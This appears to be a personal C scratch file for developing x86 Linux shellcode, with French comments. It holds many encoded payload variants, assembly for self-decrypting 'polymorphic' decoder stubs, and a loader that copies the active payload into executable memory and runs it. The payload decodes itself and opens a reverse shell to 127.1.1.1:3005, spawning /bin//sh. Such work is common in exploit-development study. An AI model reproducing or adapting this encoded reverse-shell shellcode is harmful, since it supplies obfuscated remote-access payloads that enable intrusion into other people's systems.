#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

// save -- \xeb\x11\x5e\x31\xc9\xb1\x08\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\xb1\x02\xb4\x06\xce\x81

//char shellcode[] =                                                                                                  "\x31\xc0\xb0\x01\xb3\x05\xcd\x80";
// char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x08\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\xb1\x02\xb4\x06\xce\x81";

// XOR ALL register ==> \x31\xC0\x31\xDB\x31\xC9\x31\xD2\x31\xFF\x31\xF6

// Executer : gcc -m32 shellcode.c -o shellcode && objdump -D shellcode > disass.shellcode && strace ./shellcode

// BYTE PTR [esi+ecx*1] ==> 80 2c 0e 01

//VRAI
// \xeb\x11\x5e\x31\xc9\xb1\x08\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\xb1\x02\xb4\x06\xce\x81

// ESSAIE :
// \xeb\x11\x5e\x31\xc9\xb1\x07\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x06\xe8\xea\xff\xff\xff\x31\xc1\xb1\x02\xb4\x06\xce\x81

void main() {
    // char shellcode[] ="\x31\xC0\x31\xDB\x31\xC9\x68\x7F\x01\x01\x01\x66\x68\x0B\xBD\x66\xB8\x67\x01\xB3\x02\x66\x53\x41\x31\xD2\xCD\x80\x89\xC3\x66\xB8\x6A\x01\x89\xE1\xB2\x10\xCD\x80\x50\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x04\x03\x89\xC1\xB0\x3F\x49\xCD\x80\x75\xF9\x89\xC8\xB2\x0B\x92\x8D\x1C\x24\x89\xE3\xCD\x80\x40\x31\xDB\xCD\x80";
    // char shellcode[] ="\x31\xC0\x31\xDB\x31\xC9\x68\x7F\x01\x01\x01\x66\x68\x0B\xBD\x66\xB8\x67\x01\xB3\x02\x66\x53\x41\x31\xD2\xCD\x80\x89\xC3\x66\xB8\x6A\x01\x89\xE1\xB2\x10\xCD\x80\x50\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x04\x03\x89\xC1\xB0\x3F\x49\xCD\x80\x75\xF9\x89\xC8\xB2\x0B\x92\x8D\x1C\x24\x89\xE3\xCD\x80\x40\x31\xDB";

    // test polymorphisme (apr√®s le \xff\xff\xff)
    // char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x07\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x31\xc1\xb1\x02\xb4\x06\xce\x81";
    // char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x07\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\xb1\x02\xb4\x06\xce\x80";
    // char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x07\x80\x6c\x0e\xfe\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x31\xc1\xb1\x02\xb4\x06\xce\x81";

    // char shellcode[] = "\xEB\x11\x5E\x31\xC9\xB1\x08\x80\x6C\x0E\xFF\x01\x80\xE9\x01\x75\xF6\xEB\x05\xE8\xEA\xFF\xFF\xFF\x32\xc1\xb1\x02\xb4\x06\xce\x81";
    // char shellcode[] = "\xEB\x14\x5E\x31\xC9\xB1\x08\x80\x6C\x0E\xFE\x01\x80\xE9\x01\x80\xF9\x01\x75\xF3\xEB\x05\xE8\xE7\xFF\xFF\xFF\x32\xc1\xb1\x02\xb4\x06\xce\x80"; // avec
    //// char shellcode[] = "\xEB\x14\x5E\x31\xC9\xB1\x08\x80\x6C\x0E\xFF\x01\x80\xE9\x01\x80\xF9\x01\x75\xF3\xEB\x05\xE8\xE7\xFF\xFF\xFF\x31\xc1\xb1\x02\xb4\x06\xce\x81";
    // char shellcode[] = "\xEB\x1A\x5E\x31\xC9\x80\xC1\x02\x31\xD2\x8A\x54\x0E\xFE\x30\x54\x0E\xFF\x80\xC1\x01\x80\xF9\x09\x75\xEE\xEB\x05\xE8\xE1\xFF\xFF\xFF"+"\x31\xf1\x70\xb1\xb2\xb6\xc8\x4d";



    // char shellcode[] = "\xEB\x1A\x5E\x31\xC9\x80\xC1\x02\x31\xD2\x8A\x54\x0E\xFE\x30\x54\x0E\xFF\x80\xC1\x01\x80\xF9\x09\x75\xEE\xEB\x05\xE8\xE1\xFF\xFF\xFF\x31\xf1\xf1\xea\xea\xf8\xa1\x17\x7e\x00\x00\x67\x0e\x63\xb6\xdb\xde\xdf\x66\xb2\xb1\x64\x35\x12\x70\xe3\x1f\x4d\x09\x4a\xa5\xde\xd2\x6b\x88\x68\x53\xa2\xdd\x4d\xd0\x38\x06\x41\x5c\x1b\x00\x47\x00\x4d\x0b\x6d\x07\x8a\x48\x71\x8f\x76\x84\x4d\xf5\x8c\x70\x41\x7a\xb9\x99\x1f\x91\x38\xad\x6a\x2e\x4d\xc0\x71\xea";
    ////// char shellcode[] = "\xeb\x1a\x5e\x31\xc9\x80\xc1\x02\x31\xd2\x8a\x54\x0e\xfe\x30\x54\x0e\xff\x80\xc1\x01\x80\xf9\x09\x75\xee\xeb\x05\xe8\xe1\xff\xff\xff\x31\xc0\x31\xdb\x31\xc9\x68\x7f\x01\x01\x01\x66\x68\x0b\xbd\x66\xb8\x67\x01\xb3\x02\x66\x53\x41\x31\xd2\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\xb2\x10\xcd\x80\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x04\x03\x89\xc1\xb0\x3f\x49\xcd\x80\x75\xf9\x89\xc8\xb2\x0b\x92\x8d\x1c\x24\x89\xe3\xcd\x80\x40\x31\xdb";
    char shellcode[] = "\xeb\x1a\x5e\x31\xc9\x80\xc1\x02\x31\xd2\x8a\x54\x0e\xfe\x30\x54\x0e\xff\x80\xc1\x01\x80\xf9\x4f\x75\xee\xeb\x05\xe8\xe1\xff\xff\xff\x31\xc0\x31\xdb\x31\xc9\x68\x7f\x01\x01\x01\x66\x68\x0b\xbd\x66\xb8\x67\x01\xb3\x02\x66\x53\x41\x31\xd2\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\xb2\x10\xcd\x80\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x04\x03\x89\xc1\xb0\x3f\x49\xcd\x80\x75\xf9\x89\xc8\xb2\x0b\x92\x8d\x1c\x24\x89\xe3\xcd\x80\x40\x31\xdb";
    printf("[+] shellcode length: %u\n", strlen(shellcode));

    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}

// [0; n-1]
/*
jmp    function_to_decrypt_code
decrypt_code:
pop    esi
xor    ecx,ecx
add    cl,0x2
instruction_decrypt_code:
sub    BYTE PTR [esi+ecx*1-0x2],0x1
add    cl,0x1
cmp cl, 0x9
jne    instruction_decrypt_code
jmp    code_encrypted
function_to_decrypt_code:
call   decrypt_code
code_encrypted:
*/
// \xEB\x15\x5E\x31\xC9\x80\xC1\x02\x80\x6C\x0E\xFE\x01\x80\xC1\x01\x80\xF9\x09\x75\xF3\xEB\x05\xE8\xE6\xFF\xFF\xFF

// [1; n]
/*
jmp    function_to_decrypt_code
decrypt_code:
pop    esi
xor    ecx,ecx
add    cl,0x2
instruction_decrypt_code:
sub    BYTE PTR [esi+ecx*1-0x1],0x1
add    cl,0x1
cmp cl, 0x9
jne    instruction_decrypt_code
jmp    code_encrypted
function_to_decrypt_code:
call   decrypt_code
code_encrypted:
*/
// TRES TRES TRES TRES BON
// \xEB\x15\x5E\x31\xC9\x80\xC1\x02\x80\x6C\x0E\xFF\x01\x80\xC1\x01\x80\xF9\x09\x75\xF3\xEB\x05\xE8\xE6\xFF\xFF\xFF

// ASM decrypt
/*
jmp    function_to_decrypt_code
decrypt_code:
pop    esi
xor    ecx,ecx
mov    cl,0x8
instruction_decrypt_code:
sub    BYTE PTR [esi+ecx*1-0x1],0x1
sub    cl,0x1
jne    instruction_decrypt_code
jmp    code_encrypted
function_to_decrypt_code:
call   decrypt_code
code_encrypted:
*/

// \xEB\x17\x5E\x31\xC9\xB1\x08\x80\x6C\x0E\xFE\x01\x80\xE9\x01\xF7\xC1\x01\x00\x00\x00\x75\xF0\xEB\x05\xE8\xE4\xFF\xFF\xFF\x31\xc1\xb1\x02\xb4\x06\xce\x81



/*
jmp    function_to_decrypt_code
decrypt_code:
pop    esi
xor    ecx,ecx
mov    cl,0x8
instruction_decrypt_code:
sub    BYTE PTR [esi+ecx*1-0x1],0x1
sub    cl,0x1
cmp cl, 0x1
jne    instruction_decrypt_code
jmp    code_encrypted
function_to_decrypt_code:
call   decrypt_code
code_encrypted:
*/
// Fonctionne bien !!!
// \xEB\x14\x5E\x31\xC9\xB1\x08\x80\x6C\x0E\xFF\x01\x80\xE9\x01\x80\xF9\x01\x75\xF3\xEB\x05\xE8\xE7\xFF\xFF\xFF\x31\xc1\xb1\x02\xb4\x06\xce\x81


/*
jmp    function_to_decrypt_code
decrypt_code:
pop    esi
xor    ecx,ecx
instruction_decrypt_code:
sub    BYTE PTR [esi+ecx*1-0x1],0x1
add    cl,0x1
cmp cl, 0x8
jne    instruction_decrypt_code
jmp    code_encrypted
function_to_decrypt_code:
call   decrypt_code
code_encrypted:
*/
// \xEB\x12\x5E\x31\xC9\x80\x6C\x0E\xFF\x01\x80\xC1\x01\x80\xF9\x08\x75\xF3\xEB\x05\xE8\xE9\xFF\xFF\xFF\x32\xc1\xb1\x02\xb4\x06\xce\x81

/*
jmp    function_to_decrypt_code
decrypt_code:
pop    esi
xor    ecx,ecx
inc ecx
instruction_decrypt_code:
sub    BYTE PTR [esi+ecx*1-0x1],0x1
add    cl,0x1
cmp cl, 0x9
jne    instruction_decrypt_code
jmp    code_encrypted
function_to_decrypt_code:
call   decrypt_code
code_encrypted:
*/
// \xEB\x13\x5E\x31\xC9\x41\x80\x6C\x0E\xFF\x01\x80\xC1\x01\x80\xF9\x09\x75\xF3\xEB\x05\xE8\xE8\xFF\xFF\xFF